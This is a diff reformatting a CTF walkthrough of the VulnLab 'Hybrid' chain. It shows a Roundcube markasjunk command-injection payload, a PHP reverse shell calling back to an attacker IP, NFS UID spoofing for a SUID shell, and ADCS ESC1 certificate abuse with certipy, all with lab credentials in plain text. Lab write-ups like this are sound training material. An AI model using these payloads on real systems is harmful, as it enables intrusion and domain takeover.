@@ -1,7 +1,4 @@
-Title: Hybrid
-Slug: ctf/vulnlab/chains/hybrid
-Date: 2025-04-09 18:00
-Category: CTF
+# Hybrid
 
 Hybrid is an easy VulnLab chain.
 
@@ -14,11 +11,11 @@ Target is:
 - 10.10.246.198
 ## Enumeration
 
-~~~shell
+```shell
 sudo nmap -sC -sV -iL targets.txt -oN nmap.txt
-~~~
+```
 
-~~~
+```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-05 11:00 CEST
 Nmap scan report for 10.10.246.197
 Host is up (0.030s latency).
@@ -132,21 +129,21 @@ Service Info: Host:  mail01.hybrid.vl; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 2 IP addresses (2 hosts up) scanned in 134.29 seconds
-~~~
+```
 
 
 Host `10.10.246.197` - `DC01.hybrid.vl` appears to be a DC whilst `10.10.246.198` - `mail01.hybrid.vl` is a mail server, hosting RoundCube on port 80:
 
 
-![[mail01-roundcube.png]]
+![mail01-roundcube](../../../images/ctf/vulnlab/chains/hybrid/mail01-roundcube.png)
 
 Having no credentials, further enumeration is performed. Host `mail01` has a NFS service running that for some reason nmap couldn't properly enumerate on the first run; a more specific NFS enumeration is performed as follows:
 
-~~~shell
+```shell
 nmap -p 111,2049 --script="nfs-*" 10.10.246.1988
-~~~
+```
 
-![[mail01-nfs-nmap.png]]
+![mail01-nfs-nmap](../../../images/ctf/vulnlab/chains/hybrid/mail01-nfs-nmap.png)
 
 ## mail01.hybrid.vl
 
@@ -154,41 +151,41 @@ nmap -p 111,2049 --script="nfs-*" 10.10.246.1988
 
 The remote share `/opt/share` is accessible and mountable with read and write permissions. It's then mounted as follows:
 
-~~~shell
+```shell
 mkdir shared
 sudo mount -o nolock 10.10.246.198:/opt/share shared
-~~~
+```
 
-![[mail01-nfs-mount.png]]
+![mail01-nfs-mount](../../../images/ctf/vulnlab/chains/hybrid/mail01-nfs-mount.png)
 
 Copy the archive `backup.tar.gz`  from the remote share and extract its content: 
 
-~~~shell
+```shell
 cp shared/backup.tar.gz ./
 tar -xvzf backup.tar.gz
-~~~
+```
 
-![[mail01-backup-archive.png]]
+![mail01-backup-archive](../../../images/ctf/vulnlab/chains/hybrid/mail01-backup-archive.png)
 
 The backup contains the `dovecot-users` file containing some credentials:
 
-~~~
+```
 cat etc/dovecot/dovecot-users
-~~~
+```
 
-![[mail01-dovecot-users.png]]
+![mail01-dovecot-users](../../../images/ctf/vulnlab/chains/hybrid/mail01-dovecot-users.png)
 
 Using these credentials it's possible to access to RoundCube, for example, as `peter.turner@hybrid.vl`. In the inbox, a mail from `admin@hybrid.vl` is present; this mail states that a junk filter plugin has been installed:
 
-![[mail01-roundcube-access.png]]
+![mail01-roundcube-access](../../../images/ctf/vulnlab/chains/hybrid/mail01-roundcube-access.png)
 
 After some little searching, the junk filter plugin `markasjunk` is known to be vulnerable to RCE, as explained [here](https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/). To confirm that this plugin it's actually installed, the following request is performed:
 
-~~~shell
+```shell
 curl http://mail01.hybrid.vl/plugins/markasjunk/config.inc.php
-~~~
+```
 
-![[mail01-junk-plugin-confirmation.png]]
+![mail01-junk-plugin-confirmation](../../../images/ctf/vulnlab/chains/hybrid/mail01-junk-plugin-confirmation.png)
 
 The server responds `200 OK`, confirming that the plugin it's installed.
 
@@ -200,81 +197,81 @@ The following payload it's used to run the shell command `sh /opt/share/revshell
 
 - `peter.turner&sh${IFS}/opt/share/revshell.sh&@hybrid.vl`
 
-![[mail01-rce-payload.png]]
+![mail01-rce-payload](../../../images/ctf/vulnlab/chains/hybrid/mail01-rce-payload.png)
 
 Where `revshell.sh` is a shell script previously copied to the mounted share. It contains the following reverse shell:
 
-~~~shell
+```shell
 php -r '$sock=fsockopen("10.8.6.6",8090);exec("sh <&3 >&3 2>&3");'
-~~~
+```
 
 In order to trigger the exploit, it's necessary to mark as junk a mail having as sender the previous payload. A mail is sent as follows:
 
-![[mail01-send-mail.png]]
+![mail01-send-mail](../../../images/ctf/vulnlab/chains/hybrid/mail01-send-mail.png)
 
 Then, the mail is marked as junk, triggering the reverse shell:
 
-![[mail01-mark-as-junk.png]]
+![mail01-mark-as-junk](../../../images/ctf/vulnlab/chains/hybrid/mail01-mark-as-junk.png)
 
-![[mail01-reverse-shell.png]]
+![mail01-reverse-shell](../../../images/ctf/vulnlab/chains/hybrid/mail01-reverse-shell.png)
 
 Current user `www-data` has no particular privileges and cannot access to domain user  `peter.turner@hybrid.vl` home folder on the machine which could contain some interesting information.
 
 Root squashing it's not disabled so it's not possible to abuse NFS to escalate to root privileges. 
 
-![[mail01-nfs-exports.png]]
+![mail01-nfs-exports](../../../images/ctf/vulnlab/chains/hybrid/mail01-nfs-exports.png)
 
 However, it's stil possible to use it to obtain `peter.turner@hybrid.vl` privileges. get this users's uid as follows:
 
-~~~shell
+```shell
 id peter.turner@hybrid.vl
-~~~
+```
 
-![[mail01-peterturner-uid.png]]
+![mail01-peterturner-uid](../../../images/ctf/vulnlab/chains/hybrid/mail01-peterturner-uid.png)
 
 On the attacker machine, try adding a user with the UID `902601108`:
 
-~~~shell
+```shell
 sudo useradd -u 902601108 -M tmpuser
-~~~
+```
 
-![[mail01-useradd-uid-fail.png]]
+![mail01-useradd-uid-fail](../../../images/ctf/vulnlab/chains/hybrid/mail01-useradd-uid-fail.png)
 
 UID `902601108` is outside allowed limits; edit `/etc/logins.defs` to set an higher upper limit:
 
-~~~shell
+```shell
 sudo vim /etc/login.defs
-~~~
+```
 
-![[mail01-uid-max.png]]
+![mail01-uid-max](../../../images/ctf/vulnlab/chains/hybrid/mail01-uid-max.png)
 
 Re-run previous command to create a user with the specified UID.
 
 After copying the `bash` binary from the remote machine to the attacker machine (attacker's `bash` binary misses some dynamic libraries on the remote machine), copy this binary (renamed to `tmpbash`) into the mounted share using created user `tmpuser` and add SUID privileges:
 
-~~~shell
+```shell
 sudo su tmpuser -c "cp ../tmpbash ./"
-~~~
+```
 
-![[mail01-suid-bash.png]]
+![mail01-suid-bash](../../../images/ctf/vulnlab/chains/hybrid/mail01-suid-bash.png)
 
 On the remote machine, `tmpuser`'s UID `902601108` will be mapped to `peter.turner@hybrid.vl`. Running `tmpbash` with the `-p` will open a shell as the SUID user:
 
-![[mail01-nfs-uid-mapping.png]]
+![mail01-nfs-uid-mapping](../../../images/ctf/vulnlab/chains/hybrid/mail01-nfs-uid-mapping.png)
 
 ### Credentials Gathering
 
 `peter.turner@hybrid.vl` home contains the flag and a kdb password store:
 
-![[mail01-peterturner-home.png]]
+![mail01-peterturner-home](../../../images/ctf/vulnlab/chains/hybrid/mail01-peterturner-home.png)
 
 Using the same password as for RoundCube, the domain account password for `peter.turner@hybrid.vl` is found:
 
-![[mail01-kdb.png]]
+![mail01-kdb](../../../images/ctf/vulnlab/chains/hybrid/mail01-kdb.png)
 
 Moreover, `peter.turner@hybrid.vl` has unrestricted sudo privileges on `mail01.hybrid.vl`:
 
-![[mail01-peterturner-sudo.png]]
+![mail01-peterturner-sudo](../../../images/ctf/vulnlab/chains/hybrid/mail01-peterturner-sudo.png)
 
 ## DC01.hybrid.vl
 
@@ -282,60 +279,60 @@ Moreover, `peter.turner@hybrid.vl` has unrestricted sudo privileges on `mail01.h
 
 Found credentials are then used to enumerate the domain. Bloodhound's python collection is used as follows:
 
-~~~shell
+```shell
 bloodhound-python --zip -dc DC01.hybrid.vl -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -d 'hybrid.vl' -ns 127.0.0.1
-~~~
+```
 
-![[dc01-bloodhound-enum.png]]
+![dc01-bloodhound-enum](../../../images/ctf/vulnlab/chains/hybrid/dc01-bloodhound-enum.png)
 
 Basic enumeration leads to nothing; certipy-ad is then used to enumerate CAs and ADCS services:
 
-~~~shell
+```shell
 certipy-ad find -dc-ip 10.10.246.197 -u peter.turner@hybrid.vl -p b0cwR+G4Dzl_rw -json -old-bloodhound
-~~~
+```
 
-![[dc01-certipy-enum.png]]
+![dc01-certipy-enum](../../../images/ctf/vulnlab/chains/hybrid/dc01-certipy-enum.png)
 In the output stands out the certificate template `HybridComputers` that can be abused to escalate privileges and impersonate any user on the domain (**ESC1**):
 
-![[dc01-esc1-certificate-template.png]]
+![dc01-esc1-certificate-template](../../../images/ctf/vulnlab/chains/hybrid/dc01-esc1-certificate-template.png)
 
 A clearer view it's provided by bloodhound: "Domain Computers" group can enroll this template:
 
-![[dc01-hybridcomputers-bloodhound.png]]
+![dc01-hybridcomputers-bloodhound](../../../images/ctf/vulnlab/chains/hybrid/dc01-hybridcomputers-bloodhound.png)
 
 ### Privilege Escalation
 
 Using `peter.turner@hybrid.vl` sudo privileges on `mail01`, it's possible to dump a cached machine ticket stored in `/var/lib/sss/db`: 
 
-![[dc01-mail01-ccache.png]]
+![dc01-mail01-ccache](../../../images/ctf/vulnlab/chains/hybrid/dc01-mail01-ccache.png)
 
 This ticket can then be used to request a certificate impersonating `Administrator` user with the template `HybridComputers`, authenticating as `mail01`:
 
-~~~shell
+```shell
 export KRB5CCNAME=ccache_HYBRID.VL
 
 ertipy-ad req -u "MAIL01$" -k -ca "hybrid-DC01-CA" -target 'DC01.hybrid.vl' -template 'HybridComputers' -upn "Administrator@hybrid.vl" -dns 'dc0.hybrid.vl' -key-size 4096 
-~~~
+```
 
-![[dc01-esc1-exploit.png]]
+![dc01-esc1-exploit](../../../images/ctf/vulnlab/chains/hybrid/dc01-esc1-exploit.png)
 Use then the certificate to authenticate to the DC as `Administrator`:
 
-~~~shell
+```shell
 certipy-ad auth -pf administrator_dc0.pfx -dc-ip 10.10.246.197
-~~~
+```
 
-![[dc01-administrator-auth.png]]
+![dc01-administrator-auth](../../../images/ctf/vulnlab/chains/hybrid/dc01-administrator-auth.png)
 
 Please note that requesting the certificate without specifying the`dNSHostName` with the `-dns` option as follows:
 
-~~~shell
+```shell
 certipy-ad req -u "MAIL01$" -k -ca "hybrid-DC01-CA" -target 'DC01.hybrid.vl' -template 'HybridComputers' -upn "Administrator@hybrid.vl" -key-size 4096 
-~~~
+```
 
-![[dc01-failed-certificate-request.png]]
+![dc01-failed-certificate-request](../../../images/ctf/vulnlab/chains/hybrid/dc01-failed-certificate-request.png)
 
 will generate the error `KDC_ERROR_CLIENT_NOT_TRUSTED(Reserved for PKINIT)` since machines accounts do not have the `UPN` attribute but the `dNSHostName` attribute.
 
 Access to `DC01` as `Administrator` and get the flag:
 
-![[dc01-administrator-flag.png]]
+![dc01-administrator-flag](../../../images/ctf/vulnlab/chains/hybrid/dc01-administrator-flag.png)
